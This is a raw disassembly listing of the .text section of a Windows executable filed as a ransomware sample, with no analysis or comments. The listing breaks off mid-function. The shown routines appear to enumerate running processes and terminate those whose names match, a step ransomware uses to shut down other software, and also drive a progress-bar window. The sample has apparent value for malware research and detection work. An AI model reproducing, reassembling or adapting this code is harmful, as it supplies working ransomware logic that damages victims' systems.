
malware_samples/ransomware/da23793f3cc05f8381c1b4c5960c72b9f6cbffff96d23085d4f07fe572116acd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	51                   	push   %ecx
  401001:	68 08 e3 41 00       	push   $0x41e308
  401006:	68 fc e2 41 00       	push   $0x41e2fc
  40100b:	ff 15 24 e1 41 00    	call   *0x41e124
  401011:	50                   	push   %eax
  401012:	ff 15 28 e1 41 00    	call   *0x41e128
  401018:	a3 84 70 42 00       	mov    %eax,0x427084
  40101d:	85 c0                	test   %eax,%eax
  40101f:	75 02                	jne    0x401023
  401021:	59                   	pop    %ecx
  401022:	c3                   	ret
  401023:	56                   	push   %esi
  401024:	57                   	push   %edi
  401025:	bf e8 03 00 00       	mov    $0x3e8,%edi
  40102a:	57                   	push   %edi
  40102b:	e8 bb 30 00 00       	call   0x4040eb
  401030:	83 c4 04             	add    $0x4,%esp
  401033:	8b f0                	mov    %eax,%esi
  401035:	8d 44 24 08          	lea    0x8(%esp),%eax
  401039:	50                   	push   %eax
  40103a:	57                   	push   %edi
  40103b:	56                   	push   %esi
  40103c:	6a 05                	push   $0x5
  40103e:	ff 15 84 70 42 00    	call   *0x427084
  401044:	85 c0                	test   %eax,%eax
  401046:	74 2a                	je     0x401072
  401048:	56                   	push   %esi
  401049:	e8 46 2f 00 00       	call   0x403f94
  40104e:	81 c7 10 27 00 00    	add    $0x2710,%edi
  401054:	57                   	push   %edi
  401055:	e8 91 30 00 00       	call   0x4040eb
  40105a:	83 c4 08             	add    $0x8,%esp
  40105d:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401061:	51                   	push   %ecx
  401062:	57                   	push   %edi
  401063:	8b f0                	mov    %eax,%esi
  401065:	56                   	push   %esi
  401066:	6a 05                	push   $0x5
  401068:	ff 15 84 70 42 00    	call   *0x427084
  40106e:	85 c0                	test   %eax,%eax
  401070:	75 d6                	jne    0x401048
  401072:	5f                   	pop    %edi
  401073:	8b c6                	mov    %esi,%eax
  401075:	5e                   	pop    %esi
  401076:	59                   	pop    %ecx
  401077:	c3                   	ret
  401078:	cc                   	int3
  401079:	cc                   	int3
  40107a:	cc                   	int3
  40107b:	cc                   	int3
  40107c:	cc                   	int3
  40107d:	cc                   	int3
  40107e:	cc                   	int3
  40107f:	cc                   	int3
  401080:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401084:	56                   	push   %esi
  401085:	8b 74 24 08          	mov    0x8(%esp),%esi
  401089:	57                   	push   %edi
  40108a:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40108e:	8b c6                	mov    %esi,%eax
  401090:	3b cf                	cmp    %edi,%ecx
  401092:	74 22                	je     0x4010b6
  401094:	8b 50 44             	mov    0x44(%eax),%edx
  401097:	83 e2 fe             	and    $0xfffffffe,%edx
  40109a:	3b d1                	cmp    %ecx,%edx
  40109c:	75 0c                	jne    0x4010aa
  40109e:	8b 48 48             	mov    0x48(%eax),%ecx
  4010a1:	83 e1 fe             	and    $0xfffffffe,%ecx
  4010a4:	74 15                	je     0x4010bb
  4010a6:	8b c6                	mov    %esi,%eax
  4010a8:	eb 08                	jmp    0x4010b2
  4010aa:	8b 10                	mov    (%eax),%edx
  4010ac:	85 d2                	test   %edx,%edx
  4010ae:	74 0b                	je     0x4010bb
  4010b0:	03 c2                	add    %edx,%eax
  4010b2:	3b cf                	cmp    %edi,%ecx
  4010b4:	75 de                	jne    0x401094
  4010b6:	5f                   	pop    %edi
  4010b7:	b0 01                	mov    $0x1,%al
  4010b9:	5e                   	pop    %esi
  4010ba:	c3                   	ret
  4010bb:	5f                   	pop    %edi
  4010bc:	32 c0                	xor    %al,%al
  4010be:	5e                   	pop    %esi
  4010bf:	c3                   	ret
  4010c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4010c4:	56                   	push   %esi
  4010c5:	50                   	push   %eax
  4010c6:	6a 00                	push   $0x0
  4010c8:	68 01 00 10 00       	push   $0x100001
  4010cd:	ff 15 0c e1 41 00    	call   *0x41e10c
  4010d3:	8b f0                	mov    %eax,%esi
  4010d5:	85 f6                	test   %esi,%esi
  4010d7:	75 07                	jne    0x4010e0
  4010d9:	5e                   	pop    %esi
  4010da:	ff 25 18 e1 41 00    	jmp    *0x41e118
  4010e0:	57                   	push   %edi
  4010e1:	6a 00                	push   $0x0
  4010e3:	56                   	push   %esi
  4010e4:	ff 15 b8 e0 41 00    	call   *0x41e0b8
  4010ea:	3d 02 01 00 00       	cmp    $0x102,%eax
  4010ef:	75 2f                	jne    0x401120
  4010f1:	6a 01                	push   $0x1
  4010f3:	56                   	push   %esi
  4010f4:	ff 15 1c e1 41 00    	call   *0x41e11c
  4010fa:	85 c0                	test   %eax,%eax
  4010fc:	75 14                	jne    0x401112
  4010fe:	ff 15 18 e1 41 00    	call   *0x41e118
  401104:	56                   	push   %esi
  401105:	8b f8                	mov    %eax,%edi
  401107:	ff 15 20 e1 41 00    	call   *0x41e120
  40110d:	8b c7                	mov    %edi,%eax
  40110f:	5f                   	pop    %edi
  401110:	5e                   	pop    %esi
  401111:	c3                   	ret
  401112:	56                   	push   %esi
  401113:	33 ff                	xor    %edi,%edi
  401115:	ff 15 20 e1 41 00    	call   *0x41e120
  40111b:	8b c7                	mov    %edi,%eax
  40111d:	5f                   	pop    %edi
  40111e:	5e                   	pop    %esi
  40111f:	c3                   	ret
  401120:	56                   	push   %esi
  401121:	bf f6 02 00 00       	mov    $0x2f6,%edi
  401126:	ff 15 20 e1 41 00    	call   *0x41e120
  40112c:	8b c7                	mov    %edi,%eax
  40112e:	5f                   	pop    %edi
  40112f:	5e                   	pop    %esi
  401130:	c3                   	ret
  401131:	cc                   	int3
  401132:	cc                   	int3
  401133:	cc                   	int3
  401134:	cc                   	int3
  401135:	cc                   	int3
  401136:	cc                   	int3
  401137:	cc                   	int3
  401138:	cc                   	int3
  401139:	cc                   	int3
  40113a:	cc                   	int3
  40113b:	cc                   	int3
  40113c:	cc                   	int3
  40113d:	cc                   	int3
  40113e:	cc                   	int3
  40113f:	cc                   	int3
  401140:	81 ec 18 01 00 00    	sub    $0x118,%esp
  401146:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40114b:	33 c4                	xor    %esp,%eax
  40114d:	89 84 24 14 01 00 00 	mov    %eax,0x114(%esp)
  401154:	55                   	push   %ebp
  401155:	8b ac 24 20 01 00 00 	mov    0x120(%esp),%ebp
  40115c:	57                   	push   %edi
  40115d:	8b bc 24 30 01 00 00 	mov    0x130(%esp),%edi
  401164:	68 24 e3 41 00       	push   $0x41e324
  401169:	89 7c 24 14          	mov    %edi,0x14(%esp)
  40116d:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401174:	00 
  401175:	e8 36 1c 00 00       	call   0x402db0
  40117a:	83 c4 04             	add    $0x4,%esp
  40117d:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  401183:	85 ed                	test   %ebp,%ebp
  401185:	75 3f                	jne    0x4011c6
  401187:	80 bc 24 2c 01 00 00 	cmpb   $0x0,0x12c(%esp)
  40118e:	00 
  40118f:	75 4c                	jne    0x4011dd
  401191:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  401198:	50                   	push   %eax
  401199:	e8 22 ff ff ff       	call   0x4010c0
  40119e:	83 c4 04             	add    $0x4,%esp
  4011a1:	85 c0                	test   %eax,%eax
  4011a3:	0f 85 b1 01 00 00    	jne    0x40135a
  4011a9:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  4011af:	5f                   	pop    %edi
  4011b0:	5d                   	pop    %ebp
  4011b1:	8b 8c 24 14 01 00 00 	mov    0x114(%esp),%ecx
  4011b8:	33 cc                	xor    %esp,%ecx
  4011ba:	e8 57 32 00 00       	call   0x404416
  4011bf:	81 c4 18 01 00 00    	add    $0x118,%esp
  4011c5:	c3                   	ret
  4011c6:	80 bc 24 2c 01 00 00 	cmpb   $0x0,0x12c(%esp)
  4011cd:	00 
  4011ce:	74 0d                	je     0x4011dd
  4011d0:	55                   	push   %ebp
  4011d1:	e8 eb 31 00 00       	call   0x4043c1
  4011d6:	83 c4 04             	add    $0x4,%esp
  4011d9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4011dd:	53                   	push   %ebx
  4011de:	56                   	push   %esi
  4011df:	e8 1c fe ff ff       	call   0x401000
  4011e4:	8b d8                	mov    %eax,%ebx
  4011e6:	85 db                	test   %ebx,%ebx
  4011e8:	0f 84 4a 01 00 00    	je     0x401338
  4011ee:	8b ff                	mov    %edi,%edi
  4011f0:	c6 44 24 13 00       	movb   $0x0,0x13(%esp)
  4011f5:	c7 44 24 14 57 00 00 	movl   $0x57,0x14(%esp)
  4011fc:	00 
  4011fd:	8b f3                	mov    %ebx,%esi
  4011ff:	90                   	nop
  401200:	f6 46 44 01          	testb  $0x1,0x44(%esi)
  401204:	75 5e                	jne    0x401264
  401206:	33 c9                	xor    %ecx,%ecx
  401208:	33 c0                	xor    %eax,%eax
  40120a:	66 3b 4e 38          	cmp    0x38(%esi),%cx
  40120e:	73 13                	jae    0x401223
  401210:	8b 56 3c             	mov    0x3c(%esi),%edx
  401213:	8a 0c 42             	mov    (%edx,%eax,2),%cl
  401216:	88 4c 04 20          	mov    %cl,0x20(%esp,%eax,1)
  40121a:	0f b7 56 38          	movzwl 0x38(%esi),%edx
  40121e:	40                   	inc    %eax
  40121f:	3b c2                	cmp    %edx,%eax
  401221:	72 ed                	jb     0x401210
  401223:	85 ed                	test   %ebp,%ebp
  401225:	75 4b                	jne    0x401272
  401227:	8b 7e 44             	mov    0x44(%esi),%edi
  40122a:	8b 84 24 30 01 00 00 	mov    0x130(%esp),%eax
  401231:	57                   	push   %edi
  401232:	50                   	push   %eax
  401233:	53                   	push   %ebx
  401234:	e8 47 fe ff ff       	call   0x401080
  401239:	83 c4 0c             	add    $0xc,%esp
  40123c:	84 c0                	test   %al,%al
  40123e:	74 20                	je     0x401260
  401240:	57                   	push   %edi
  401241:	e8 7a fe ff ff       	call   0x4010c0
  401246:	83 c4 04             	add    $0x4,%esp
  401249:	89 44 24 14          	mov    %eax,0x14(%esp)
  40124d:	85 c0                	test   %eax,%eax
  40124f:	75 0b                	jne    0x40125c
  401251:	8b 44 24 18          	mov    0x18(%esp),%eax
  401255:	ff 00                	incl   (%eax)
  401257:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  40125c:	83 4e 44 01          	orl    $0x1,0x44(%esi)
  401260:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401264:	8b 06                	mov    (%esi),%eax
  401266:	85 c0                	test   %eax,%eax
  401268:	0f 84 94 00 00 00    	je     0x401302
  40126e:	03 f0                	add    %eax,%esi
  401270:	eb 8e                	jmp    0x401200
  401272:	8b c5                	mov    %ebp,%eax
  401274:	8d 50 01             	lea    0x1(%eax),%edx
  401277:	8a 08                	mov    (%eax),%cl
  401279:	40                   	inc    %eax
  40127a:	84 c9                	test   %cl,%cl
  40127c:	75 f9                	jne    0x401277
  40127e:	2b c2                	sub    %edx,%eax
  401280:	50                   	push   %eax
  401281:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  401285:	55                   	push   %ebp
  401286:	51                   	push   %ecx
  401287:	e8 b3 30 00 00       	call   0x40433f
  40128c:	83 c4 0c             	add    $0xc,%esp
  40128f:	85 c0                	test   %eax,%eax
  401291:	75 d1                	jne    0x401264
  401293:	8b c5                	mov    %ebp,%eax
  401295:	8d 50 01             	lea    0x1(%eax),%edx
  401298:	8a 08                	mov    (%eax),%cl
  40129a:	40                   	inc    %eax
  40129b:	84 c9                	test   %cl,%cl
  40129d:	75 f9                	jne    0x401298
  40129f:	2b c2                	sub    %edx,%eax
  4012a1:	80 7c 04 20 2e       	cmpb   $0x2e,0x20(%esp,%eax,1)
  4012a6:	74 17                	je     0x4012bf
  4012a8:	8b c5                	mov    %ebp,%eax
  4012aa:	8d 50 01             	lea    0x1(%eax),%edx
  4012ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4012b0:	8a 08                	mov    (%eax),%cl
  4012b2:	40                   	inc    %eax
  4012b3:	84 c9                	test   %cl,%cl
  4012b5:	75 f9                	jne    0x4012b0
  4012b7:	2b c2                	sub    %edx,%eax
  4012b9:	38 4c 04 20          	cmp    %cl,0x20(%esp,%eax,1)
  4012bd:	75 a5                	jne    0x401264
  4012bf:	8b 56 44             	mov    0x44(%esi),%edx
  4012c2:	52                   	push   %edx
  4012c3:	e8 f8 fd ff ff       	call   0x4010c0
  4012c8:	83 c4 04             	add    $0x4,%esp
  4012cb:	89 44 24 14          	mov    %eax,0x14(%esp)
  4012cf:	85 c0                	test   %eax,%eax
  4012d1:	75 07                	jne    0x4012da
  4012d3:	ff 07                	incl   (%edi)
  4012d5:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  4012da:	83 4e 44 01          	orl    $0x1,0x44(%esi)
  4012de:	80 bc 24 34 01 00 00 	cmpb   $0x0,0x134(%esp)
  4012e5:	00 
  4012e6:	8b 46 44             	mov    0x44(%esi),%eax
  4012e9:	0f 84 75 ff ff ff    	je     0x401264
  4012ef:	33 ed                	xor    %ebp,%ebp
  4012f1:	83 e0 fe             	and    $0xfffffffe,%eax
  4012f4:	89 84 24 30 01 00 00 	mov    %eax,0x130(%esp)
  4012fb:	8b f3                	mov    %ebx,%esi
  4012fd:	e9 62 ff ff ff       	jmp    0x401264
  401302:	53                   	push   %ebx
  401303:	e8 8c 2c 00 00       	call   0x403f94
  401308:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  40130c:	83 c4 04             	add    $0x4,%esp
  40130f:	85 ed                	test   %ebp,%ebp
  401311:	74 0b                	je     0x40131e
  401313:	c7 84 24 30 01 00 00 	movl   $0x0,0x130(%esp)
  40131a:	00 00 00 00 
  40131e:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  401323:	74 1a                	je     0x40133f
  401325:	85 ed                	test   %ebp,%ebp
  401327:	74 23                	je     0x40134c
  401329:	e8 d2 fc ff ff       	call   0x401000
  40132e:	8b d8                	mov    %eax,%ebx
  401330:	85 db                	test   %ebx,%ebx
  401332:	0f 85 b8 fe ff ff    	jne    0x4011f0
  401338:	b8 05 00 00 00       	mov    $0x5,%eax
  40133d:	eb 19                	jmp    0x401358
  40133f:	85 ed                	test   %ebp,%ebp
  401341:	74 09                	je     0x40134c
  401343:	55                   	push   %ebp
  401344:	e8 4b 2c 00 00       	call   0x403f94
  401349:	83 c4 04             	add    $0x4,%esp
  40134c:	8b 07                	mov    (%edi),%eax
  40134e:	f7 d8                	neg    %eax
  401350:	1b c0                	sbb    %eax,%eax
  401352:	f7 d0                	not    %eax
  401354:	23 44 24 14          	and    0x14(%esp),%eax
  401358:	5e                   	pop    %esi
  401359:	5b                   	pop    %ebx
  40135a:	8b 8c 24 1c 01 00 00 	mov    0x11c(%esp),%ecx
  401361:	5f                   	pop    %edi
  401362:	5d                   	pop    %ebp
  401363:	33 cc                	xor    %esp,%ecx
  401365:	e8 ac 30 00 00       	call   0x404416
  40136a:	81 c4 18 01 00 00    	add    $0x118,%esp
  401370:	c3                   	ret
  401371:	cc                   	int3
  401372:	cc                   	int3
  401373:	cc                   	int3
  401374:	cc                   	int3
  401375:	cc                   	int3
  401376:	cc                   	int3
  401377:	cc                   	int3
  401378:	cc                   	int3
  401379:	cc                   	int3
  40137a:	cc                   	int3
  40137b:	cc                   	int3
  40137c:	cc                   	int3
  40137d:	cc                   	int3
  40137e:	cc                   	int3
  40137f:	cc                   	int3
  401380:	e9 c6 32 00 00       	jmp    0x40464b
  401385:	cc                   	int3
  401386:	cc                   	int3
  401387:	cc                   	int3
  401388:	cc                   	int3
  401389:	cc                   	int3
  40138a:	cc                   	int3
  40138b:	cc                   	int3
  40138c:	cc                   	int3
  40138d:	cc                   	int3
  40138e:	cc                   	int3
  40138f:	cc                   	int3
  401390:	81 ec 90 00 00 00    	sub    $0x90,%esp
  401396:	6a 3e                	push   $0x3e
  401398:	8d 44 24 54          	lea    0x54(%esp),%eax
  40139c:	6a 00                	push   $0x0
  40139e:	50                   	push   %eax
  40139f:	e8 cc 32 00 00       	call   0x404670
  4013a4:	83 c4 0c             	add    $0xc,%esp
  4013a7:	6a 00                	push   $0x0
  4013a9:	c7 44 24 50 42 00 00 	movl   $0x42,0x50(%esp)
  4013b0:	00 
  4013b1:	89 7c 24 54          	mov    %edi,0x54(%esp)
  4013b5:	ff 15 24 e1 41 00    	call   *0x41e124
  4013bb:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  4013bf:	51                   	push   %ecx
  4013c0:	89 44 24 72          	mov    %eax,0x72(%esp)
  4013c4:	c7 44 24 64 4c 01 00 	movl   $0x14c,0x64(%esp)
  4013cb:	00 
  4013cc:	ff 15 50 e0 41 00    	call   *0x41e050
  4013d2:	85 c0                	test   %eax,%eax
  4013d4:	75 07                	jne    0x4013dd
  4013d6:	81 c4 90 00 00 00    	add    $0x90,%esp
  4013dc:	c3                   	ret
  4013dd:	53                   	push   %ebx
  4013de:	55                   	push   %ebp
  4013df:	56                   	push   %esi
  4013e0:	68 02 7f 00 00       	push   $0x7f02
  4013e5:	6a 00                	push   $0x0
  4013e7:	ff 15 50 e2 41 00    	call   *0x41e250
  4013ed:	50                   	push   %eax
  4013ee:	ff 15 54 e2 41 00    	call   *0x41e254
  4013f4:	8b 54 24 68          	mov    0x68(%esp),%edx
  4013f8:	8b 35 6c e0 41 00    	mov    0x41e06c,%esi
  4013fe:	6a 08                	push   $0x8
  401400:	52                   	push   %edx
  401401:	89 44 24 14          	mov    %eax,0x14(%esp)
  401405:	ff d6                	call   *%esi
  401407:	8b d8                	mov    %eax,%ebx
  401409:	8b 44 24 68          	mov    0x68(%esp),%eax
  40140d:	6a 0a                	push   $0xa
  40140f:	50                   	push   %eax
  401410:	ff d6                	call   *%esi
  401412:	8b 4c 24 68          	mov    0x68(%esp),%ecx
  401416:	6a 58                	push   $0x58
  401418:	51                   	push   %ecx
  401419:	8b e8                	mov    %eax,%ebp
  40141b:	ff d6                	call   *%esi
  40141d:	8b 54 24 68          	mov    0x68(%esp),%edx
  401421:	6a 5a                	push   $0x5a
  401423:	52                   	push   %edx
  401424:	89 44 24 18          	mov    %eax,0x18(%esp)
  401428:	ff d6                	call   *%esi
  40142a:	6a 2c                	push   $0x2c
  40142c:	8b f0                	mov    %eax,%esi
  40142e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401432:	6a 00                	push   $0x0
  401434:	50                   	push   %eax
  401435:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  40143c:	00 
  40143d:	e8 2e 32 00 00       	call   0x404670
  401442:	8b 4c 24 74          	mov    0x74(%esp),%ecx
  401446:	83 c4 0c             	add    $0xc,%esp
  401449:	33 c0                	xor    %eax,%eax
  40144b:	6a 01                	push   $0x1
  40144d:	51                   	push   %ecx
  40144e:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  401452:	89 44 24 50          	mov    %eax,0x50(%esp)
  401456:	89 44 24 54          	mov    %eax,0x54(%esp)
  40145a:	89 44 24 58          	mov    %eax,0x58(%esp)
  40145e:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  401462:	ff 15 58 e0 41 00    	call   *0x41e058
  401468:	8b 44 24 68          	mov    0x68(%esp),%eax
  40146c:	89 44 24 14          	mov    %eax,0x14(%esp)
  401470:	89 44 24 18          	mov    %eax,0x18(%esp)
  401474:	33 c0                	xor    %eax,%eax
  401476:	89 44 24 30          	mov    %eax,0x30(%esp)
  40147a:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40147e:	8b c5                	mov    %ebp,%eax
  401480:	99                   	cltd
  401481:	f7 fe                	idiv   %esi
  401483:	68 60 fa ff ff       	push   $0xfffffa60
  401488:	68 60 fa ff ff       	push   $0xfffffa60
  40148d:	8b c8                	mov    %eax,%ecx
  40148f:	8b c3                	mov    %ebx,%eax
  401491:	69 c9 a0 05 00 00    	imul   $0x5a0,%ecx,%ecx
  401497:	99                   	cltd
  401498:	f7 7c 24 18          	idivl  0x18(%esp)
  40149c:	8b 54 24 34          	mov    0x34(%esp),%edx
  4014a0:	89 54 24 24          	mov    %edx,0x24(%esp)
  4014a4:	8b 54 24 38          	mov    0x38(%esp),%edx
  4014a8:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  4014ac:	89 54 24 28          	mov    %edx,0x28(%esp)
  4014b0:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  4014b4:	69 c0 a0 05 00 00    	imul   $0x5a0,%eax,%eax
  4014ba:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4014be:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4014c2:	8d 44 24 24          	lea    0x24(%esp),%eax
  4014c6:	50                   	push   %eax
  4014c7:	ff 15 70 e2 41 00    	call   *0x41e270
  4014cd:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  4014d1:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  4014d8:	00 
  4014d9:	c7 44 24 40 ff ff ff 	movl   $0xffffffff,0x40(%esp)
  4014e0:	ff 
  4014e1:	c7 44 24 44 14 00 00 	movl   $0x14,0x44(%esp)
  4014e8:	00 
  4014e9:	c7 44 24 48 40 06 42 	movl   $0x420640,0x48(%esp)
  4014f0:	00 
  4014f1:	51                   	push   %ecx
  4014f2:	8b 54 24 6c          	mov    0x6c(%esp),%edx
  4014f6:	52                   	push   %edx
  4014f7:	ff 15 5c e0 41 00    	call   *0x41e05c
  4014fd:	8b 1d 5c e2 41 00    	mov    0x41e25c,%ebx
  401503:	6a 00                	push   $0x0
  401505:	6a 00                	push   $0x0
  401507:	6a 0e                	push   $0xe
  401509:	57                   	push   %edi
  40150a:	ff d3                	call   *%ebx
  40150c:	8b e8                	mov    %eax,%ebp
  40150e:	8b 44 24 68          	mov    0x68(%esp),%eax
  401512:	50                   	push   %eax
  401513:	ff 15 60 e0 41 00    	call   *0x41e060
  401519:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40151d:	51                   	push   %ecx
  40151e:	6a 01                	push   $0x1
  401520:	68 39 04 00 00       	push   $0x439
  401525:	57                   	push   %edi
  401526:	ff d3                	call   *%ebx
  401528:	8b 54 24 68          	mov    0x68(%esp),%edx
  40152c:	52                   	push   %edx
  40152d:	8b f0                	mov    %eax,%esi
  40152f:	ff 15 64 e0 41 00    	call   *0x41e064
  401535:	3b f5                	cmp    %ebp,%esi
  401537:	7d 3e                	jge    0x401577
  401539:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401540:	8b 44 24 68          	mov    0x68(%esp),%eax
  401544:	50                   	push   %eax
  401545:	89 74 24 40          	mov    %esi,0x40(%esp)
  401549:	c7 44 24 44 ff ff ff 	movl   $0xffffffff,0x44(%esp)
  401550:	ff 
  401551:	ff 15 60 e0 41 00    	call   *0x41e060
  401557:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40155b:	51                   	push   %ecx
  40155c:	6a 01                	push   $0x1
  40155e:	68 39 04 00 00       	push   $0x439
  401563:	57                   	push   %edi
  401564:	ff d3                	call   *%ebx
  401566:	8b 54 24 68          	mov    0x68(%esp),%edx
  40156a:	52                   	push   %edx
  40156b:	8b f0                	mov    %eax,%esi
  40156d:	ff 15 64 e0 41 00    	call   *0x41e064
  401573:	3b f5                	cmp    %ebp,%esi
  401575:	7c c9                	jl     0x401540
  401577:	6a 00                	push   $0x0
  401579:	6a 00                	push   $0x0
  40157b:	68 39 04 00 00       	push   $0x439
  401580:	57                   	push   %edi
  401581:	ff d3                	call   *%ebx
  401583:	8b 44 24 68          	mov    0x68(%esp),%eax
  401587:	50                   	push   %eax
  401588:	ff 15 68 e0 41 00    	call   *0x41e068
  40158e:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401592:	51                   	push   %ecx
  401593:	ff 15 54 e2 41 00    	call   *0x41e254
  401599:	5e                   	pop    %esi
  40159a:	5d                   	pop    %ebp
  40159b:	b8 01 00 00 00       	mov    $0x1,%eax
  4015a0:	5b                   	pop    %ebx
  4015a1:	81 c4 90 00 00 00    	add    $0x90,%esp
  4015a7:	c3                   	ret
  4015a8:	cc                   	int3
  4015a9:	cc                   	int3
  4015aa:	cc                   	int3
  4015ab:	cc                   	int3
  4015ac:	cc                   	int3
  4015ad:	cc                   	int3
  4015ae:	cc                   	int3
  4015af:	cc                   	int3
  4015b0:	a1 00 50 42 00       	mov    0x425000,%eax
  4015b5:	53                   	push   %ebx
  4015b6:	55                   	push   %ebp
  4015b7:	56                   	push   %esi
  4015b8:	33 c9                	xor    %ecx,%ecx
  4015ba:	57                   	push   %edi
  4015bb:	be 01 00 00 00       	mov    $0x1,%esi
  4015c0:	85 c0                	test   %eax,%eax
  4015c2:	74 1a                	je     0x4015de
  4015c4:	8d 78 01             	lea    0x1(%eax),%edi
  4015c7:	8a 10                	mov    (%eax),%dl
  4015c9:	40                   	inc    %eax
  4015ca:	84 d2                	test   %dl,%dl
  4015cc:	75 f9                	jne    0x4015c7
  4015ce:	2b c7                	sub    %edi,%eax
  4015d0:	41                   	inc    %ecx
  4015d1:	03 f0                	add    %eax,%esi
  4015d3:	8b 04 8d 00 50 42 00 	mov    0x425000(,%ecx,4),%eax
  4015da:	85 c0                	test   %eax,%eax
  4015dc:	75 e6                	jne    0x4015c4
  4015de:	56                   	push   %esi
  4015df:	e8 07 2b 00 00       	call   0x4040eb
  4015e4:	33 db                	xor    %ebx,%ebx
  4015e6:	83 c4 04             	add    $0x4,%esp
  4015e9:	33 ed                	xor    %ebp,%ebp
  4015eb:	39 1d 00 50 42 00    	cmp    %ebx,0x425000
  4015f1:	74 3d                	je     0x401630
  4015f3:	bf 00 50 42 00       	mov    $0x425000,%edi
  4015f8:	8b 17                	mov    (%edi),%edx
  4015fa:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  4015fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  401600:	8a 0a                	mov    (%edx),%cl
  401602:	88 0e                	mov    %cl,(%esi)
  401604:	42                   	inc    %edx
  401605:	46                   	inc    %esi
  401606:	84 c9                	test   %cl,%cl
  401608:	75 f6                	jne    0x401600
  40160a:	8b 0f                	mov    (%edi),%ecx
  40160c:	8d 71 01             	lea    0x1(%ecx),%esi
  40160f:	90                   	nop
  401610:	8a 11                	mov    (%ecx),%dl
  401612:	41                   	inc    %ecx
  401613:	84 d2                	test   %dl,%dl
  401615:	75 f9                	jne    0x401610
  401617:	45                   	inc    %ebp
  401618:	2b ce                	sub    %esi,%ecx
  40161a:	8d 3c ad 00 50 42 00 	lea    0x425000(,%ebp,4),%edi
  401621:	03 d9                	add    %ecx,%ebx
  401623:	83 3f 00             	cmpl   $0x0,(%edi)
  401626:	75 d0                	jne    0x4015f8
  401628:	5f                   	pop    %edi
  401629:	5e                   	pop    %esi
  40162a:	5d                   	pop    %ebp
  40162b:	88 14 18             	mov    %dl,(%eax,%ebx,1)
  40162e:	5b                   	pop    %ebx
  40162f:	c3                   	ret
  401630:	5f                   	pop    %edi
  401631:	5e                   	pop    %esi
  401632:	5d                   	pop    %ebp
  401633:	88 1c 18             	mov    %bl,(%eax,%ebx,1)
  401636:	5b                   	pop    %ebx
  401637:	c3                   	ret
  401638:	cc                   	int3
  401639:	cc                   	int3
  40163a:	cc                   	int3
  40163b:	cc                   	int3
  40163c:	cc                   	int3
  40163d:	cc                   	int3
  40163e:	cc                   	int3
  40163f:	cc                   	int3
  401640:	56                   	push   %esi
  401641:	57                   	push   %edi
  401642:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  401646:	8b 17                	mov    (%edi),%edx
  401648:	8b c2                	mov    %edx,%eax
  40164a:	8d 70 01             	lea    0x1(%eax),%esi
  40164d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401650:	8a 08                	mov    (%eax),%cl
  401652:	40                   	inc    %eax
  401653:	84 c9                	test   %cl,%cl
  401655:	75 f9                	jne    0x401650
  401657:	2b c6                	sub    %esi,%eax
  401659:	8b 74 24 14          	mov    0x14(%esp),%esi
  40165d:	3b f0                	cmp    %eax,%esi
  40165f:	7e 02                	jle    0x401663
  401661:	8b f0                	mov    %eax,%esi
  401663:	8b 44 24 10          	mov    0x10(%esp),%eax
  401667:	56                   	push   %esi
  401668:	52                   	push   %edx
  401669:	50                   	push   %eax
  40166a:	e8 81 30 00 00       	call   0x4046f0
  40166f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  401673:	83 c4 0c             	add    $0xc,%esp
  401676:	89 31                	mov    %esi,(%ecx)
  401678:	01 37                	add    %esi,(%edi)
  40167a:	5f                   	pop    %edi
  40167b:	33 c0                	xor    %eax,%eax
  40167d:	5e                   	pop    %esi
  40167e:	c2 10 00             	ret    $0x10
  401681:	cc                   	int3
  401682:	cc                   	int3
  401683:	cc                   	int3
  401684:	cc                   	int3
  401685:	cc                   	int3
  401686:	cc                   	int3
  401687:	cc                   	int3
  401688:	cc                   	int3
  401689:	cc                   	int3
  40168a:	cc                   	int3
  40168b:	cc                   	int3
  40168c:	cc                   	int3
  40168d:	cc                   	int3
  40168e:	cc                   	int3
  40168f:	cc                   	int3
  401690:	81 ec 18 01 00 00    	sub    $0x118,%esp
  401696:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  40169b:	33 c4                	xor    %esp,%eax
  40169d:	89 84 24 14 01 00 00 	mov    %eax,0x114(%esp)
  4016a4:	8b 84 24 20 01 00 00 	mov    0x120(%esp),%eax
  4016ab:	2d 10 01 00 00       	sub    $0x110,%eax
  4016b0:	53                   	push   %ebx
  4016b1:	8b 9c 24 2c 01 00 00 	mov    0x12c(%esp),%ebx
  4016b8:	56                   	push   %esi
